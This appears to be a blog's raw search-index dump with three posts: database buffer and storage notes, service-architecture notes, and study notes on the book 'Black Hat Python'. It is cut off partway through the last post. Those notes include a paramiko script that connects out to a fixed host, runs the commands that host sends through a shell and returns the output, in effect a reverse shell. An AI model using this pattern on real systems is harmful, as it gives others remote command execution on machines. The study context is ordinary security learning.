meta-writes\n\n\nCache Pages\n\nAccess Pattern\n\nRandom block reads and writes\nConcurrent access to multiple blocks\nPredictable access to certain blocks\n\n\nhow to cache?\n\nbuffer pool: a pool of pages\n\nCaching multiple blocks\nImplement swapping\nPool Size\n\n要夠大 (至少所有正在用到的page都要放到pool)\n\n不然會Deadlock\n\ndetect deadlock\n\n看pin有沒有timeout\n\n\ndeal with deadlock\n\n抓一個犧牲者\n\n把他的block全部unpin\n之後在慢慢pin回來\n\n\n\n\n如果是一個人pin爆了pool?\n\n只能死亡 (丟例外)\n\n\n\n\n\n\n\n\n\n\n利用Predictable access block\n\nPinning Blocks: 不會被swap出去\n\n流程\n\npin block 在某個page\nread\n完成就unpin block\n\n\nA block can be pinned multiple times\n\n\nPinning Pages:\n\nHit\n\ncache成功\n\n\nSwapping\n\npage dirty要swap回去\n很多page? replacement strategies\n\n\nWaiting\n\n所有人都pin了，所以要等\n\n\n\n\nBuffers = page + page的meta data\n\n\n例子\n\n\n\n\n現在做pin(60); pin(70);\n\n\nBuffer Replacement Strategies\n\nNaïve\n\n只要unpin的就好\n\n\n\n\nhit rate低\n\nbuffers are not evenly utilized\n\n\n\n\nFIFO\n\n挑read in時間最早的\n\n\n\n\nAssumption: the older blocks are less likely to be used in the future\n\ncounter: catalog blocks!!\n\n\n\n\nLRU\n\n找最早unpin的\n\n\n\n\nAssumption: blocks that are not used in the near past will unlikely be used in the near future\n\n\nClock\n\n很像Naïve，但是從上次replace的地方開始找\n\n\n\n\n\n\n\n\n\n\n\n\nCaching Logs\n\nLog用在\n\nACID的C與I，Write-Ahead-Logging (WAL)\n\ncommit時\n\nlog在tx中做的動作到buffer\n要commit時，先把buffer倒到log file\n倒完再寫一個完成commit(COMMIT log)的log到log file\n\n\nswap page時\n\n把buffer flush掉\n\n\nrollback\n\n誰要rollback?\n\n沒有COMMIT log的tx\n\n\n3 possibilities for each action on disk\n\nWith log and block\n\n用log去undo，把block改好\n\n\nWith log, but without block\n\n用log去undo，把block改好\n\n\nWithout log and block\n\n不用管\n\n\n\n\n\n\nAssumption of WAL\n\neach block-write either succeeds or fails entirely on a disk, despite power failure\n\n\n\n\n\n\n需要Pool嗎?\n\n不用\n\nlog是single buffer\nAlways appends\nAlways sequential backward reads\n\n\n\n\n\n\n\n\n\nrecord怎麼存? (linux的fs只有char與block，但現在我們有datatype)\n\n\n所有record(a table)都要在同一個file?\n\nHomogeneous\n\n有利於single-table queries\n\n\nHeterogeneous\n\n有利於需要join的queries\n\n\n\n\n\n一筆record(row)的所有部分都要在同一個block?\n\nSpanned\n\n\n沒有空間浪費\nrecord大小不用受制於block大小\n\n\nUnspanned\n\n\n只要讀一個block就是一筆record\n\n\n\n\n\n所有部分都要緊貼著彼此嗎?\n\nRow-oriented store\n\nRow-by-row\n\n\n\nColumn-oriented store\n\n存成好幾個array\n\n\n\nPros &amp; Cons\n\n\n\n\n\n\n\n欄位(datatype)要固定大小嗎?\n\nFixed-Length\nVariable-Length\n\n\n\n\n內部block怎麼處理\n\nthe record’s length changes\n\n\n\n\ndelete a record\n\nsoft delete\n\n\n刪掉的空間沒辦法用\n\n\n把space空出來\n\n\n\n\n\n\ncannot random access a record in a page =&gt; no position information\n\npage layout\n\nheader放\n\nrecord總數\nfree space的終點\n指到record的mapping table\n\n\n\n改大小的話\n\n要重新找連續的free space\n碎片化\n\nVACUUM command\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n怎麼管理free space (怎麼知道哪裡有free space)\n\nChaining\n\n\n\n\nMeta-Pages\n\n\n\n\nMeta-File\n\n\n\n\n\n\n\n\n\n每個record的大小? 其他與db有關的訊息放在哪?\n\ncatalog tables\n\nTable metadata\n\ntable的資訊 (大小、長度…)\n\n\nView metadata\n\nview的訊息 (creater,…)\n\n\nIndex metadata\n\n每個欄位的index\n\n\n\n\nin mem\n\nStatistical metadata\n\n關於table的統計資訊，可以在plan時使用\n\n\n\n\n\n\n\nGroup Communication\n分散式計算\nDB Workloads\n\nOperational workloads\n\nOLTP (On-line Transaction Processing)\n跑tx多，執行時間短\n\n\nAnalytic workloads\n\nOnline (OLAP) or offline\n資料分析\n\n\n\n\n\nCloud DB\nSAE\n\n\nhigh Scalability\n\n可水平擴展來拉throughput\n\nS through partitioning\n\nPartition your hot tables\n\n\n\nhorizontally\nvertically\n\n\n要處理\n\n\n分散的\n\nmetadata manager\nquery processor (record, plan)\ntransactions\n\nDistributed S2PL\n\n看 分散式那一份筆記 的 怎麼commit那一部分\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhigh Availability\n\n不能死，除了網路、硬體問題外\n\nA through replication\n\nReplicate all tables across servers\n\n\nReplication\n\nEager\n\n在ㄌtx commit之前，每台都要完成\n\nstrong consistency, slow tx\n\n\n\n\n\nLazy\n\nlocal先寫，之後再非同步的同步到另一台去\n\neventual consistency, fast tx\n\n\n\n\n\n\n\nWho Writes?\n\nMaster/Slave\n\nwrite只有某一台處理\nread由其他台負責\n\n\nMulti-Master\n\nwrite每一台都可以負責\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nElasticity\n\n能根據machine與workload去動態調整data分布\n\nRe-Partitioning\n\nData chunking\n\n使用者指定\n系統生成 (consistent hashing)\n\nMaster server for load monitoring\n\n\n\n\n\n\nMigrate\n\nMigration with Determinism\n\n做一個空的replica\n在兩個db上跑同一個tx，只拉用到的data (Foreground Pushing)\n\n\n\n\n剩下就是非同步的推 (Background Pushing)\n\n\n\n\n\n\nMigration vs. Crabbing\n\nClient served by any node running faster\nMigration delay imperceptible\n我同時serve，我同時migrate\n\n\n\n\n\n\n\n\n\n\nSAE + 完整的retional DB基本上不可能\n\nWorkarounds\n\nNo expressive model\n\n在應用層處理(dirty work)\n\n\nNo flexible queries\n\n多發幾個query或是繼續在應用層處理(dirty work)\n\n\nNo tx and ACID\n\n在應用層處理\n\n\n\n\n\nRef\nnthu-datalab/db\n","categories":["DB","Reading"]},{"title":"巨型服務架構：分布式/資料庫優化/記憶體快取設計/IO模型","url":"/2022/01/mega-service-arch/","content":"動機\n查漏補缺\n\nch1: 高性能架構\n效能指標\n\nthroughput\n\nTPS(transaction per second)\nQPS(queries per second)\n\n\n併發數\n\n同時處理的數目: 同時在線user, 併發連線數…\n\n\nresponse time\n\namdahl’s law\n\n\n可靠度指標\n\n無故障時間\n\n\n\n指標之間的影響\n\nthroughput &amp; 併發數\n\n(一開始) 併發數上升 =&gt; throughput上升\n(持平) 併發數上升 =&gt; throughput不變\n\n系統臨界點\n\n\n(下降) 併發數上升 =&gt; throughput下降\n\n系統隨時都會崩潰\n\n\n\n\n併發數 &amp; response time\n\n(併發req數目) m/m/1的平均時間公式\n\nservice的處理rate(mu那一個, 系統可以承受的最大併發數)\n(一開始) req的數目小於系統可以承受的最大併發數，response time上升不明顯\n(過了可以承受的最大併發數) response time急速增加\n\n\n系統中觀察到正在處理的req/thread數目\n\nresponse time大 =&gt; 卡在system中的req/thread會比較多!!\n\n\n\n\n\nch2: 分流設計\nCDN\n\n優點\n\n減少系統併發數\n減少response time\n減少網路壅塞\n\n\n原理\n\n多個CDN node，DNS做query時根據使用者位置回傳最近的ip\nCDN node會變成cache proxy，有就回傳；沒有就relay req到主機\n\n\n\n可以把CDN對地址動手腳的方法用到service discovery\nservice discovery\n\n服務註冊\n\nuser: 去registry找service的實際位置\nregistry: 維護service的清單\nserver: 要把自己登記到registry\n\n\n服務規則\n\nuser: 去registry找service地址的使用規則\nregistry: 放service地址的使用規則，讓user自己判斷要去哪\nserver: 要開發或是營運去調整規則\n\n\n\n反向代理\n由proxy分配req到不同的server (追求load balance就是load balancer；server的任務都不同就是一般的反向代理)\n\n原理\n\nlevel 4: 只看ip與port做分配\nlevel 7: 看req內容作分配，eg: http, ftp…\n\n對外面來說，ip與port都是一樣的!!\n\n\n\n\n\nch3: 服務平行設計\n\n叢集: 有很多同樣的server的set，一起提供服務\n\nserver無狀態\n\n無狀態的節點叢集\n一般都是負責query之類沒有狀態的服務\n平行喚醒問題\n\n在這個set加入定時寄信功能\n\n結果所有server一起寄信!?\n\n\n解法: 外部喚醒\n\n打req進來，跑功能，這樣就只會有一台跑\n\n\n\n\n\n\nserver有狀態\n\nserver自己維護狀態\n\n要與別人share\n\n資訊一致的節點叢集\n大家都有自己的狀態，但需要與其他server的狀態同步\n一致性問題(讀寫不一致): 我在A改的，在B看不到\n\n一致性的等級\n\n強一致性\n\n2 phases commit\n3 phases commit\n\n\n最終一致性\n\n有retry的msg queue\n\n\n\n\n\n\n\n\n不要與別人share\n\n單一服務節點叢集\nuser與server是被綁定的!!\nhow to bind?\n\nuser指定\n\nonline game的選server\n\n\n根據位置、user id\n先隨便assign，把server位置寫到cookie中\n\n\n單點失敗\n\n\n\n\nserver把狀態抽出去\n\n資訊共用的節點叢集\n在redis之類的地方紀錄state，像是session\nredis之類的地方\n\n會是bottleneck\n需要concurrent的控制\n\n\n\n\n\n\n\n\n分散式系統\n\n把server中的(實體/虛擬)元件拆掉，像web server與DB跑在不同host\n\n如果有元件是bottlebeck，可以用叢集拆掉\n\n\n一致性問題(讀寫不一致): 我在A改的，在B看不到\n\n同資訊一致的節點叢集\n\n\n所有元件是可組合的? 微服務系統\n\n\n\nch4: 運算併發\n\n多process\n\n可能在不同的cpu跑(平行)，也可能在同一顆跑(共時)\n具有很強的隔離\n\n像是開兩個server在process\n\n可以兩個指定不同的port，就有兩台獨立的server\n\n\n\n\nctx switch的成本高\n\ncache要預熱\n在userspace與kernel space之間切換\nreg的切換\n\n\nIPC不好做\nsync\n\n使用情境\n\n獨佔 (競爭)\n協作: 等對方好了在一起走\n獨佔、協作的詳細介紹，去看Parallel Thinking\n\n\n\n\n\n\n多thread\n\n可能在不同的cpu跑(平行)，也可能在同一顆跑(共時)\nctx switch的成本小\n\n都在同一塊記憶體\n有locality\n\n\n使用情境\n\n做非同步 (會block的工作)\n處理subtask，之後merge\n\n\nsync\n\n使用情境\n\n獨佔 (競爭)\n協作: 等對方好了在一起走\n獨佔、協作的詳細介紹，去看Parallel Thinking\n\n\n\n\n\n\nfiber就是continuation\n\n只能在同一顆跑(共時)\n執行fiber就會停下當下的動作，之後執行會回到原本的位置\n不會race condition\n不會平行是concurrent!!\nctx switch的代價很小\nsync\n\n使用情境\n\n協作: 等對方好了在一起走\n\n\n\n\n\n\n\nch5: 輸入輸出設計\n去看之前的文章\nch6: 資料庫設計與最佳化\n\n設計table\n\n當成設計class，但是只有primitive與reference而已\n\narray要轉90度，變成table (NF1)\n所有的欄位(primitive)可以是來自\n\n自己本身的屬性\n另一個物件展開的結果 (NF2, NF2, BCNF, 反正規化)\n\n\n去看之前的文章\n\n\n\n\nindex\n\n故障\n\n一個col做index\n\n上index的column做修改\n用錯type去query (string卻用成int，雖然會被cast，但index會失效)\n\n\n多個col做index\n\n(Btree) query沒有包含前面的col(左手邊)\n\nindex從第一個col開始sort，一直下去，所以做query時需要前面的\n\n\n(hash) 沒有全部的col\n\n\n對string做index\n\n如果有wildcast, btree與hash都會沒用，要用inverted index\n\n\nbtree\n\n!=, &lt;&gt;, NOT\nIN, NOT IN\n\nIN =&gt; BETWEEN\n\n\n\n\nnull\n\nindex沒辦法對null做任何事\n\n用其他值代替!!\n\n\n\n\n\n\n不同的engine不同的index (與其他)\n\ninnoDB會把hash自動換成btree (innoDB沒有做hash)\n\n\n\n\n自建交易\n\n可以undo的action沒差\n不能undo的action(對外界有影響)\n\n最多只能有一個\n只能在最後一位\n\n\n\n\n資料太多了\n\ntable分區 (partition)\n\n把一個table(file)分成多個檔案\n對於table的操作不變 (在外面來看這個table還是一樣)\n可以存到不同的HDD\n\n增加throughput\n增加能存的entry數量\n可以針對某一區做操作，不影響其他區\n\n\nquery最好要把當初做分區的條件放入query\n\n不然要所有分區都跑\n\n\n\n\n分庫\n\n把DB切開\n\ntable怎麼辦?\n\n分table\n\n\n\n\n\n\n分table\n\n不分割(split)table\n\n每個DB都有一些完整的table\n\n\n分割(split)table\n\n水平分割\n\n把資料放到不同的表\n\n[(1,2), (3,4)] =&gt; [(1,2)], [(3,4)]\n\n\n\n\n垂直分割\n\n依據col去割，之後用primiary key來認同一個row\n\n[(1,2), (3,4)] =&gt; [(1,3)], [(2,4)]\n\n\n\n\n\n\n原則: 不要跨table\n\n水平分割\n\n一次需要所有col\n\n\n垂直分割\n\n只要一部份col\n\n\n\n\n對於table的操作要改 (程式要改)\n\ntable變得不一樣了\n\n路由操作: 要改table的name (現在有多個table)\n拼接操作: 要多加join (垂直分割如果需要另一個表的col)\n\n\n\n\n讀寫分離\n\n多個DB分別處理讀與寫\n路由操作: 讀與寫要到對的DB\n主從複製: 主從要同步!! (一致性問題)\n\n複製的材料\n\nlog\n\nstatement: 就是指令 (但遇到調用now_time之類的，就沒辦法反映真實資料到read db上)\nrow: 就是資料\nmixed: 就是指令+資料\n\n\n\n\n非同步複製 (not reliable)\n\nwrite後立刻return，log非同步的傳\n\nwrite db掛了又沒傳log就gg了\n\n\n\n\n半同步複製\n\nwrite後等log傳到某個db才return\n\n\n全同步複製\n\nwrite後等log傳到所有db才return\n\n\n\n\n\n\n\n\n\n\nDB中介軟體\n\n就是DB的middleware，處理上面的路由操作、拼接操作、主從複製之類的問題\n\neg: MyCat\n\n\n\n\n\nch7: 快取設計\n\ncache for reading\n\ncache會花費到的時間\n\n寫入cache時\n\n生成key時\n\nhash function\n比較key\n\n\n寫入mem時\n\n寫mem\n\n寫入什麼?\n\n序列化物件\n\n讀寫時都要經過序列化\n\n\n原本的物件\n\n不用反序列化\n如果存的是reference?\n\n會發生race condition!!\n解法: 存序列化物件 或是 deep copy\n\n\n\n\n\n\n\n\n\n\n\n\n讀cache時\n\n生成key時\n\nhash function\n比較key\n\n\n讀mem時\n\n中\n\n讀mem\n\n\n沒中\n\n跑原本\n\n\n\n\n\n\n\n\ncache update\n\n被動update\n\n時效性更新\n\n有過期時間\n\n\n\n\n主動update\n\ncache aside\n\nread: 正常的讀，找不到去後面拉資料\n\n去後面拉資料的時候要不要把cache刪了?\n\n刪\n\n如果寫入中，有另一個read\n\n就會拉到舊的值到cache!!\n\n\n但寫入完成後，雙方資料就不一致了\n\n\n不刪 (good)\n\nread時，如果莫名其妙被block住\n之後這之間有write完成\nread就會拿到舊的值\n\n但這不太可能，只要\n\nread夠快\n確保不會被preemptive\n\n\n就不會發生\n\n\n\n\n\n\n\n\nwrite: 直接往後方寫，不直接更新cache\n\n\nwrite through\n\nread/write: 都透過cache (同步)\n\ncache變成單點失敗的點\n\n\n\n\nwrite behind\n\n改write through的write成非同步\n\n如果cache掛了\n\n可能沒寫到!!\n\n\n\n\n\n\n\n\n\n\ncache clear\n\n時效性\n\n訂個過期時間\n\n時間到就自己不見\n讓另一個thread去清\n\n\n\n\n固定pool數量\n\nFIFO\nLRU\n\n\n非強引用\n\nGC的延伸，有ref到的就是有用的obj，所以不能刪，但沒有就是可以刪\n\n這樣obj只有刪與不刪\n\n\n但有的情況是在mem吃緊時可以刪\n\n所以ref要有所區分\n\n\nref的分類\n\n強引用: 一般的ref\n軟引用: 會在mem不足時回收\n弱引用: 不管mem夠不夠只要被gc就會被回收\n虛引用: gc會當成看不到他\n\n\n\n\n\n\ncache 的問題\n\ncache穿透\n\n如果連後面都沒有結果?\n\n沒辦法寫到cache\ncache根本沒用!!\n\n解法: 丟空值\n\n像是linux的dentry(查詢路徑的node)遇到不存在的中間點(資料夾或是file)\ndentry會被create，但是標註(state)為不存在\n\n\n\n\n\n\n\n\ncache擊穿\n\n高頻率被access的資料被清掉?\n\n所有req都往後了!!\n會發生在\n\ncache aside (因為沒有一致的保證，throught是強一致，behind是弱一致(最終一致的下一階))\n\n時效性清理\nFIFO清理\n\n\n\n\n\n\n\n\ncache預熱\n\n需要req讓資料慢慢變多\n兩個點\n\n如果一次來大量req\n\ncache擊穿\n\n\n如果是 時效性清理 與 長時間沒有req\n\n反覆預熱\n\n\n\n\n\n\n\n\ncache的位置\n\ncache越前面越好\n常見位置\n\nclient side\n\nbrowser的\n\nlocalstorage &amp; sessionstorage\nindexdb &amp; web sql\napplication cache\n\n\n\n\n靜態cache\n\nCDN\nreverse proxy\n\n\n服務cache\n\n在stateful的服務中\n\n具有一定通用return的服務(function)做cache\n\n\n\n\nDB的cache\n\n\n\n\n\n\ncache for writing\n\ncache在前面cache所有write的資料，之後再由cache去write到db (限流)\n\n平滑write，消去大量的同樣的write req\n\n\n總體而言\n\n比起原本的write多了寫入與讀取cache的成本\n但是對於user而言，只有cache的response time (比較短!!)\n\n\ncache要在後方有資源時才開始寫入，不然後面會爆\n\n\n\nch8: 可靠性設計\n\nmodule串接方式\n\n串聯:\n\nm1 -&gt; m2 -&gt; m3 ...\n\n\n並聯:\n\nm/m/n的圖\n\n只能處理不response的server\n可以容錯到只要有一台是正確的就好\n\n\n\n\n容錯\n\nm/m/n的圖 + 裁決器(有過半數的相同response就當成是對的response)\n\n可以處理有惡意(亂回答)與不response的server\n\n拜占庭容錯!!\n\n\n可以容錯到至少有一半+1台有一樣的response就好\n\n\n\n\n\n\n可靠性設計\n\n消除單點依賴\n把串聯轉成並聯\n叢集\n\n相等式: 並聯\n主從式: 一台服務、其他backup\n\n\n\n\n\nch9: 應用保護\n\n故障等級\n\n所有user都能用所有service\n部分user都能用所有service\n部分user都能用部分service\n不能提供service但可以恢復\n系統crash但不影響其他系統\n系統crash且影響到其他系統\n\n\n隔離\n\n用thread pool(或是semaphore去替代)，去包服務\n\n每次invoke就是用thread跑\n如果沒有thread可以用了(像是所有thread都因為server掛了，而block)，也繼續跑\n\n\n\n\n限流/恢復\n\ntc的qdisc\nalgo\n\n時間窗\n\n一段時間中只放最多幾個req進來\n\n如果有大量的req在開始計時時，一次出現\n\n後面來看根本沒限到流 (還是一次很多)\n從system來看\n\n會有一堆沒辦法服務到\n後面的服務空轉\n\n\n\n\n\n\n\n\n漏桶\n\n把時間窗的時間變小，一放一個req，剩下用queue去存\n\n現在整個流平順了\n但是如果queue不夠大\n\n從system來看\n\n會有一堆沒辦法服務到\n後面的服務空轉\n\n\n\n\n\n\n\n\ntoken bucket\n\n每個單位時間生一個token，1個token放一個req\n\ntoken可以存!!\n\n避免服務空轉\n\n\n\n\n如果不調整token的總數，放著讓它長\n\n如果有大量的req在開始計時時，一次出現\n\n後面來看根本沒限到流 (還是一次很多)\n\n\n\n\n\n\n\n\n兩個差在?\n\n限流: 把收的req壓在一定數量\n恢復: 慢慢把可以收的req往上拉\n\n\n\n\n降級/融斷\n\n(手法) 把複雜的server換成簡單的\n\n不直接讀db改讀cache\n精確結果改成近似結果\n返回靜態結果 (不跑運算)\n同步改成非同步\n停用非必要的功能\n禁止寫入\n依據user level做diffSrv\n\n\n降級/融斷依據\n\n失敗次數/機率過高\n限流啟動時\n手動\n\n\n兩個差在?\n\n降級: 以降低response time\n融斷: 以維持服務繼續\n\n\n\n\n\nch10: 前端高性能\n\n資源下載\n\n資源壓縮\n\ncontent-encoding\n\n\n減少req\n\n資源合併\n\nsprite圖\n\n\nkeep-alive與polling與server push\n\n\n資源快取\n\nEtag等等\n\n\n\n\nredner最佳化\n\nReflow &amp; Repaint (最花時間的步驟)\n\n整個網頁就是一棵樹\n\n最後要排版(reflow)\n畫到畫面上(repaint)\n\n\n讓影響範圍變小\n觸發方式\n\ndom新增/刪除\n\n=&gt; 直接改dom的內容\n=&gt; 讓frontend framework代勞\n\n\ndom大小/定位方式/邊距/pesudo class改變狀態\n\n=&gt; 保持上面的不變\n(要常常變動) =&gt; 把parent node設成display: none，從一開始就沒有在tree中\n\n這樣reflow就會是1次而已\n\n\n\n\n\n\n\n\nlazy loading\n\n先載入必要的部分，需要再load其他的\n\n\nproload/prefetch\n\n比較大的檔案可以先下載\n\n\n\n\n\nch11: 架構設計理論\nskip\nch12: 高性能架構實踐\nskip\n","categories":["System","Distributed","Reading"]},{"title":"blackhat python - network programming","url":"/2020/9/python-black-hat-np/","content":"動機\n來做個筆記吧\n這裡有帶到基本的network programming與SSH的使用\n\n環境 &amp; py3\n書上的code是py2，同時code很舊，因此會用這個repo的code來解釋\n用WSL2測試\nCH2\n基本的TCP client&amp;server\ntcp_client.py\nimport sockettarget_host = &quot;127.0.0.1&quot;target_port = 9999# create a socket objectclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)# connect the clientclient.connect((target_host, target_port))# NULL!!!# send some dataclient.send(b&quot;GET / HTTP/1.1\\r\\nHost: google.com\\r\\n\\r\\n&quot;)# client.sendto(b&quot;AAABBBCCC&quot;, (target_host, target_port))# receive dataresponse = client.recv(4096)print(response)\nUDP &amp; TCP client的差別在\n\n\n\n\nsocket (創socket時)\nconnect (與server建立連線，三段握手)\nsend (送資料)\n\n\n\n\nUDP\nSOCK_STREAM\n不用\nsendto(data, tuple)\n\n\nTCP\nSOCK_DGRAM\nconnect((target_host, target_port))\nsend(data)\n\n\n\n\ntcp_server.py\nimport socketimport threadingbind_ip = &quot;0.0.0.0&quot;bind_port = 9999server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.bind((bind_ip, bind_port))server.listen(5)print(&quot;[*] Listening on %s:%d&quot; % (bind_ip, bind_port))# this is our client handling threaddef handle_client(client_socket):    # just print out what the client sends    request = client_socket.recv(1024)    print(&quot;[*] Received: %s&quot; % request)    # send back a packet    client_socket.send(b&quot;ACK!&quot;)    print(client_socket.getpeername())    client_socket.close()while True:    client, addr = server.accept()    print(&quot;[*] Accepted connection from: %s:%d&quot; % (addr[0], addr[1]))    # spin up our client thread to handle incoming data    client_handler = threading.Thread(target=handle_client, args=(client,))    client_handler.start()\n這裡是用thread來處理每個進來的連線，之後會看到在同一個thread(就原本收連線的thread)處理每個進來的連線的手法(select,epool)\n\ntcp_proxy.py\nimport sysimport socketimport threading# this is a pretty hex dumping function directly taken from# http://code.activestate.com/recipes/142812-hex-dumper/def hexdump(src, length=16):    result = []    digits = 4 if isinstance(src, str) else 2    for i in range(0, len(src), length):        s = src[i:i + length]        hexa = b&#x27; &#x27;.join([b&quot;%0*X&quot; % (digits, ord(x)) for x in s])        text = b&#x27;&#x27;.join([x if 0x20 &lt;= ord(x) &lt; 0x7F else b&#x27;.&#x27; for x in s])        result.append(            b&quot;%04X   %-*s   %s&quot; % (i, length * (digits + 1), hexa, text))    print(b&#x27;\\n&#x27;.join(result))def receive_from(connection):    buffer = b&#x27;&#x27;    # We set a 2 second time-out. Depending on your target this may need    # to be adjusted    connection.settimeout(2)    try:        # keep reading into the buffer until there&#x27;s no more data or we        # time-out        while True:            data = connection.recv(4096)            if not data:                break            buffer += data    except TimeoutError:        pass    return buffer# modify any requests destined for the remote hostdef request_handler(buffer):    # perform packet modifications    return buffer# modify any responses destined for the local hostdef response_handler(buffer):    # perform packet modifications    return bufferdef proxy_handler(client_socket, remote_host, remote_port, receive_first):    # connect to the remote host    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    remote_socket.connect((remote_host, remote_port))    # receive data from the remote end if necessary    if receive_first:        remote_buffer = receive_from(remote_socket)        hexdump(remote_buffer)        # send it to our response handler        remote_buffer = response_handler(remote_buffer)        # if we have data to send to our local client send it        if len(remote_buffer):            print(&quot;[&lt;==] Sending %d bytes to localhost.&quot; % len(remote_buffer))            client_socket.send(remote_buffer)    # now let&#x27;s loop and read from local, send to remote, send to local    # rinse wash repeat    while True:        # read from local host        local_buffer = receive_from(client_socket)        if len(local_buffer):            print(&quot;[==&gt;] Received %d bytes from localhost.&quot; % len(local_buffer))            hexdump(local_buffer)            # send it to our request handler            local_buffer = request_handler(local_buffer)            # send off the data to the remote host            remote_socket.send(local_buffer)            print(&quot;[==&gt;] Sent to remote.&quot;)        # receive back the response        remote_buffer = receive_from(remote_socket)        if len(remote_buffer):            print(&quot;[&lt;==] Received %d bytes from remote.&quot; % len(remote_buffer))            hexdump(remote_buffer)            # send to our response handler            remote_buffer = response_handler(remote_buffer)            # send the response to the local socket            client_socket.send(remote_buffer)            print(&quot;[&lt;==] Sent to localhost.&quot;)        # if no more data on either side close the connections        if not len(local_buffer) or not len(remote_buffer):            client_socket.close()            remote_socket.close()            print(&quot;[*] No more data. Closing connections.&quot;)            breakdef server_loop(local_host, local_port, remote_host, remote_port,                receive_first):    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    try:        server.bind((local_host, local_port))    except socket.error as exc:        print(&quot;[!!] Failed to listen on %s:%d&quot; % (local_host,                                                  local_port))        print(&quot;[!!] Check for other listening sockets or correct &quot;              &quot;permissions.&quot;)        print(f&quot;[!!] Caught exception error: &#123;exc&#125;&quot;)        sys.exit(0)    print(&quot;[*] Listening on %s:%d&quot; % (local_host, local_port))    server.listen(5)    while True:        client_socket, addr = server.accept()        # print out the local connection information        print(&quot;[==&gt;] Received incoming connection from %s:%d&quot; % (            addr[0], addr[1]))        # start a thread to talk to the remote host        proxy_thread = threading.Thread(target=proxy_handler, args=(            client_socket, remote_host, remote_port, receive_first))        proxy_thread.start()def main():    # no fancy command line parsing here    if len(sys.argv[1:]) != 5:        print(&quot;Usage: ./proxy.py [localhost] [localport] [remotehost] &quot;              &quot;[remoteport] [receive_first]&quot;)        print(&quot;Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;)        sys.exit(0)    # setup local listening parameters    local_host = sys.argv[1]    local_port = int(sys.argv[2])    # setup remote target    remote_host = sys.argv[3]    remote_port = int(sys.argv[4])    # this tells our proxy to connect and receive data    # before sending to the remote host    receive_first = sys.argv[5]    if &quot;True&quot; in receive_first:        receive_first = True    else:        receive_first = False    # now spin up our listening socket    server_loop(local_host, local_port, remote_host, remote_port, receive_first)main()\nproxy的邏輯:\n=...=&gt;是網路的部分，-...-&gt;是記憶體讀寫的部分。\n開頭有大寫的是程式，開頭有底線是指令。\nClient =&gt; Proxy =&gt; Real_server看得更細一點Client = (proxy_ip,local_port) =&gt; ( _recv - write_buffer -&gt; _send - read_buffer -&gt;) = (server_ip,server_port) =&gt; Real_server\n如果自己要玩的話，有個問題是他會先一直讀send的東西到write_buffer，但到什麼時候才要停止?\n這尷尬的是client一直send卻沒有停下來的訊號，要做出這個訊號要利用shutdown\n如下\n&gt;&gt;&gt; c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&gt;&gt;&gt; c.connect((&#x27;127.0.0.1&#x27;,9988))&gt;&gt;&gt; c.send(b&#x27;wow&#x27;)3&gt;&gt;&gt; c.shutdown(socket.SHUT_WR)&gt;&gt;&gt; s = c.recv(4096)&gt;&gt;&gt; sb&#x27;ACK!&#x27;\nparamiko: 用python操作SSH\n先啟動WSL2的sshd\n\n改/etc/ssh/sshd_config\n\nPort = 22ListenAddress 0.0.0.0PasswordAuthentication yes\n\n重新啟動sshd\n\ndpkg-reconfigure openssh-serversudo service ssh restart \t\nssh_command.py\nimport paramikodef ssh_command(ip, user, passwd, command):    client = paramiko.SSHClient()    # client can also support using key files    # client.load_host_keys(&#x27;/home/user/.ssh/known_hosts&#x27;)    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    client.connect(ip, username=user, password=passwd)    ssh_session = client.get_transport().open_session()    if ssh_session.active:        ssh_session.exec_command(command)        print(ssh_session.recv(1024))    returnssh_command(&#x27;127.0.0.1&#x27;, &#x27;justin&#x27;, &#x27;lovesthepython&#x27;, &#x27;ls -al&#x27;)\n連線的流程：\nSSHClient(new client) -&gt; connect [ip,(account, pw)] -&gt; get_transport -&gt; open_session類比socket (SOCK_STREAM) -&gt; connect((ip, port)) -&gt; [Nope] -&gt; accept\n\nbh_sshRcmd.py\nimport subprocessimport paramikodef ssh_command(ip, user, passwd, command):    client = paramiko.SSHClient()    # client can also support using key files    # client.load_host_keys(&#x27;/home/user/.ssh/known_hosts&#x27;)    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    client.connect(ip, username=user, password=passwd)    ssh_session = client.get_transport().open_session()    if ssh_session.active:        ssh_session.send(command)# 這個其實可以不用        print(ssh_session.recv(1024))  # read banner\t## === new ===        while True:            # get the command from the SSH server            command = ssh_session.recv(1024)            try:                cmd_output = subprocess.check_output(command, shell=True)                ssh_session.send(cmd_output)            except Exception as e:                ssh_session.send(str(e))\t## === new end ===    client.close()    returnssh_command(&#x27;192.168.100.130&#x27;, &#x27;justin&#x27;, &#x27;lovesthepython&#x27;, &#x27;ClientConnected&#x27;)\n現在是在bh_sshRcmd.py執行指令再塞回去，這邊就是reverse tunnel的fu\n不過這要能運作要配合下面的code\n\nbh_sshserver.py\nimport socketimport paramikoimport threadingimport sys# using the server host key from the paramiko demo fileshost_key = paramiko.RSAKey(filename=&#x27;test_rsa.key&#x27;)class Server(paramiko.ServerInterface):    def __init__(self):        self.event = threading.Event()    def check_channel_request(self, kind, chanid):        if kind == &#x27;session&#x27;:            return paramiko.OPEN_SUCCEEDED        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED    def check_auth_password(self, username, password):        if username == &#x27;root&#x27; and password == &#x27;toor&#x27;:            return paramiko.AUTH_SUCCESSFUL        return paramiko.AUTH_FAILEDserver = sys.argv[1]ssh_port = int(sys.argv[2])try:    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sock.bind((server, ssh_port))    sock.listen(100)    print(&quot;[+] Listening for connection...&quot;)    client, addr = sock.accept()except Exception as e:    print(&quot;[-] Listen failed: &quot; + str(e))    sys.exit(1)print(&quot;[+] Got a connection!&quot;)try:    # noinspection PyTypeChecker    bhSession = paramiko.Transport(client)    bhSession.add_server_key(host_key)    server = Server()    try:        bhSession.start_server(server=server)    except paramiko.SSHException:        